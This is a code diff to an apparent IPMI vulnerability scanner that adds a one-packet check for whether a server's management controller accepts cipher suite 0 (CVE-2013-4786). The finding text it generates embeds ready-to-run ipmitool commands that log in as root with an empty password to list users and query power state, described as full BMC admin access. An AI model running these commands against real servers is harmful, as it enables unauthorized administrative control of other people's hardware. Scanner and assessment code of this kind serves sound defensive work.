@@ -30,10 +30,16 @@ import os
 import struct
 
 from ..core.models import Host, Port
+from ..core import proxy
 
 
 _DEFAULT_PORT = 623
 _TIMEOUT = 3.0
+# T2 cipher-0 session-negotiation proof: clamp to 2-6s per project convention,
+# then apply proxy.scaled() so a live BMC across a SOCKS tunnel still answers
+# before we time out.
+_CIPHER0_PROOF_MIN = 2.0
+_CIPHER0_PROOF_MAX = 6.0
 
 # IPMI 2.0 RMCP+ constants (RFC / IPMI 2.0 spec §13).
 _AUTH_HMAC_SHA1 = 0x01
@@ -548,6 +554,133 @@ def get_channel_cipher_suites(ip: str, port: int = _DEFAULT_PORT,
     return out
 
 
+# --- T2 SAFE cipher-suite-0 session-negotiation proof ---------------------
+# Difference vs. get_channel_cipher_suites (T1): App/0x54 only reads the BMC's
+# capabilities CATALOG — a list of suites the BMC claims to support. The T2
+# proof below actually engages the RMCP+ session-negotiation engine by sending
+# one Open Session Request that SELECTS auth_alg=0/integrity=0/conf=0 (cipher
+# suite 0). The BMC's Open Session Response echoes back the accepted algorithm
+# triplet inside its payload (IPMI 2.0 §13.19, Table 13-17). When both:
+#   * status byte = 0x00 (success), AND
+#   * accepted auth alg in the echoed authentication-payload = 0x00
+# then the actual auth machine (not just the metadata catalog) has agreed to
+# negotiate cipher-0 — real server-side evidence beyond capabilities.
+#
+# Non-destructive: NO RAKP1 / RAKP3 follow-up, so no session is established,
+# no credential is presented, nothing is authenticated. The BMC allocates a
+# pending session ID and times it out on its own (typical 5-30s). Single UDP
+# send + recv, one canary. Bounded by proxy.scaled(clamp(timeout, 2, 6)).
+
+
+def _parse_open_session_response_algs(pkt: bytes) -> dict | None:
+    """Extend _parse_open_session_response to also surface the ACCEPTED
+    algorithm triplet the BMC echoes back.
+
+    Open Session Response payload layout (IPMI 2.0 §13.19):
+      0     tag
+      1     rmcp+ status
+      2     max priv
+      3     reserved
+      4-7   remote console session ID (echo)
+      8-11  managed system session ID
+      12-19 authentication payload   (byte 16 = accepted auth alg)
+      20-27 integrity payload        (byte 24 = accepted integrity alg)
+      28-35 confidentiality payload  (byte 32 = accepted conf alg)
+    Returns None if the packet is too short to carry the three payloads.
+    """
+    base = _parse_open_session_response(pkt)
+    if base is None:
+        return None
+    payload = pkt[16:]
+    if len(payload) < 36:
+        # Some BMCs truncate on refusal (status != 0). Still surface the
+        # base fields so the caller can distinguish "refused with no alg
+        # payload" from "malformed".
+        base["accepted_auth_alg"] = None
+        base["accepted_integrity_alg"] = None
+        base["accepted_conf_alg"] = None
+        return base
+    base["accepted_auth_alg"] = payload[16]
+    base["accepted_integrity_alg"] = payload[24]
+    base["accepted_conf_alg"] = payload[32]
+    return base
+
+
+def cipher_zero_session_proof(ip: str, port: int = _DEFAULT_PORT,
+                              timeout: float = _TIMEOUT) -> dict:
+    """T2 SAFE proof for CVE-2013-4786: send ONE RMCP+ Open Session Request
+    with cipher suite 0 (auth=0/integrity=0/confidentiality=0) and report
+    whether the BMC's Open Session Response accepts the negotiation with
+    an echoed auth_alg=0.
+
+    Returns:
+      {reachable, session_accepted, accepted_auth_alg, accepted_integrity_alg,
+       accepted_conf_alg, status, evidence, error}
+
+    `session_accepted` is True iff status==0 AND the BMC echoed auth_alg 0.
+    `evidence` is a short human-readable summary of the observed response,
+    suitable for embedding in the finding detail. No RAKP follow-up.
+    """
+    out: dict = {"reachable": False, "session_accepted": False,
+                 "accepted_auth_alg": None, "accepted_integrity_alg": None,
+                 "accepted_conf_alg": None, "status": None,
+                 "evidence": "", "error": ""}
+    # Clamp to 2-6s then apply proxy scaling — the whole exchange is one UDP
+    # round-trip so more than 6s is wasted time on a live network.
+    base = min(max(timeout, _CIPHER0_PROOF_MIN), _CIPHER0_PROOF_MAX)
+    scaled = proxy.scaled(base)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.settimeout(scaled)
+    try:
+        remote_sid = int.from_bytes(os.urandom(4), "little") or 0xa0a0a0a0
+        try:
+            sock.sendto(_open_session_request(remote_sid, 0), (ip, port))
+        except OSError as e:
+            out["error"] = f"send failed: {e}"
+            return out
+        try:
+            data, _ = sock.recvfrom(4096)
+        except socket.timeout:
+            out["error"] = "open-session timeout"
+            return out
+        except OSError as e:
+            out["error"] = f"recv failed: {e}"
+            return out
+    finally:
+        sock.close()
+    parsed = _parse_open_session_response_algs(data)
+    if parsed is None:
+        out["error"] = "malformed open-session response"
+        return out
+    out["reachable"] = True
+    out["status"] = parsed["status"]
+    out["accepted_auth_alg"] = parsed.get("accepted_auth_alg")
+    out["accepted_integrity_alg"] = parsed.get("accepted_integrity_alg")
+    out["accepted_conf_alg"] = parsed.get("accepted_conf_alg")
+    if parsed["status"] != 0:
+        out["error"] = f"BMC refused cipher-0 negotiation (status={parsed['status']:#04x})"
+        out["evidence"] = (f"BMC returned Open Session Response status="
+                           f"{parsed['status']:#04x} — cipher-0 not accepted "
+                           f"for session negotiation.")
+        return out
+    if parsed.get("accepted_auth_alg") == 0:
+        out["session_accepted"] = True
+        out["evidence"] = (
+            f"BMC's Open Session Response status=0x00, echoed accepted "
+            f"algorithms: auth=0x00 (RAKP-none), integrity="
+            f"{parsed.get('accepted_integrity_alg')!r}, confidentiality="
+            f"{parsed.get('accepted_conf_alg')!r}. The RMCP+ negotiation "
+            f"engine ACCEPTS cipher suite 0 — any username with any "
+            f"password will authenticate.")
+    else:
+        out["evidence"] = (
+            f"BMC accepted the session (status=0x00) but selected a "
+            f"different auth algorithm ({parsed.get('accepted_auth_alg')!r}) "
+            f"instead of the requested 0 — cipher-0 advertised but not "
+            f"selectable in negotiation.")
+    return out
+
+
 def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT,
           rakp_users: list[str] | None = None) -> dict:
     """Send one Get Channel Auth Capabilities request; parse response for
@@ -563,7 +696,11 @@ def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT,
            "kg_set": False,
            "vendor": "", "manufacturer_id": 0, "product_id": 0,
            "firmware_version": "",
-           "cipher_suite_ids": [], "cipher_suite_auth_algs": {}}
+           "cipher_suite_ids": [], "cipher_suite_auth_algs": {},
+           # T2 SAFE proof outputs — populated only when the T1 confirm
+           # showed cipher_zero and the negotiation engine agrees.
+           "cipher_zero_session_accepted": False,
+           "cipher_zero_session_evidence": ""}
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.settimeout(timeout)
@@ -670,6 +807,19 @@ def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT,
         out["cipher_suite_auth_algs"] = cs["auth_algs"]
         out["cipher_zero"] = cs["cipher_zero"]
         out["cipher_zero_confirmed"] = True
+    # --- T2 SAFE cipher-suite-0 session-negotiation proof ------------------
+    # Only run when the T1 catalog check confirmed cipher-0 is offered —
+    # otherwise it is a wasted UDP round-trip against every BMC. Additive:
+    # the T1 path (cipher_zero_confirmed) still fires as before; T2 only
+    # UPGRADES the finding's depth_tier when the negotiation engine agrees.
+    if out.get("cipher_zero") and out.get("ipmi_20"):
+        try:
+            zproof = cipher_zero_session_proof(ip, port, timeout=timeout)
+        except OSError:
+            zproof = {"session_accepted": False, "evidence": ""}
+        if zproof.get("session_accepted"):
+            out["cipher_zero_session_accepted"] = True
+            out["cipher_zero_session_evidence"] = zproof.get("evidence", "")
     # RAKP hash capture, only meaningful on IPMI 2.0. Best-effort: any failure
     # (server refuses, no auth-alg match, timeout) leaves out["rakp_sweep"]
     # empty and findings() reports nothing new. The GCAC probe above is what
@@ -717,7 +867,32 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
             if pr.get("cipher_zero"):
                 confirmed = pr.get("cipher_zero_confirmed")
                 suites = pr.get("cipher_suite_ids") or []
-                if confirmed:
+                # T2 negotiation-engine proof upgrades the confirmed finding
+                # from t1 (capability catalog) to t2 (actual auth machine
+                # ACCEPTS cipher-0 for session negotiation). Additive to the
+                # existing t1 evidence — never downgrades.
+                session_proven = pr.get("cipher_zero_session_accepted")
+                session_ev = pr.get("cipher_zero_session_evidence") or ""
+                if confirmed and session_proven:
+                    detail = (
+                        f"BMC's Get Channel Cipher Suites (App/0x54) response "
+                        f"includes an auth_alg=0 cipher suite AND a follow-up "
+                        f"RMCP+ Open Session Request selecting cipher suite 0 "
+                        f"was ACCEPTED by the session-negotiation engine — "
+                        f"cipher zero is PROVEN usable on channel 0x0E. ANY "
+                        f"valid username with ANY password authenticates as "
+                        f"admin. Enumerated cipher suite IDs: {suites}. "
+                        f"Session-negotiation evidence: {session_ev} Verify "
+                        f"with: ipmitool -I lanplus -C 0 -H {h.ip} -U root "
+                        f"-P '' chassis power status")
+                    kind = "ipmi_cipher_zero_confirmed"
+                    exploit_note = (
+                        f"ipmitool -I lanplus -C 0 -H {h.ip} -U root -P '' "
+                        f"user list ; ipmitool -I lanplus -C 0 -H {h.ip} "
+                        "-U root -P '' chassis power status  # if either "
+                        "succeeds, full BMC admin")
+                    depth_tier = "t2"
+                elif confirmed:
                     # Get Channel Cipher Suites answered → hard confirm,
                     # no "if actually enabled" hedge.
                     detail = (
